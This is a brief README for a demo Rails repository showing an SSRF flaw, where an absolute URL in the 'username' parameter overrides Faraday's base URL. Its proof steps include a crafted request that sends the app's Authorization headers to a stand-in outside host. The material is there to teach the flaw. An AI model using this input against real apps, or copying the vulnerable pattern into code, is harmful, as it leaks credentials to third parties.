# README

This is a demo repository to show an SSRF vulnerability in a Rails app.

Specifically, this app uses Faraday as an http client. And it creates a connection object with a safe base url.

However, it is still vulnerable to SSRF as providing an absolute URL will override the base url.

Here is the vulnerable code:
https://github.com/Cohen-Carlisle/demo-ssrf-fix/blob/d58582849914ce7fa095abb9de88280360205dc9/app/controllers/ssrf_controller.rb#L3-L5

## Proof of SSRF vulnerability:
* Start a server with `bundle exec rails server`.
* Open a browser and navigate to http://localhost:3000?username=Cohen-Carlisle.
* Observe that the app made a `GET` to `https://api.github.com/users/Cohen-Carlisle` and got a response.
* Change the `username` to `https://example.org` (http://localhost:3000?username=https://example.org).
* Observe that the app made a `GET` to `https://example.org` and included Authorization headers.
* Oops! You just send your credentials to an attacker.

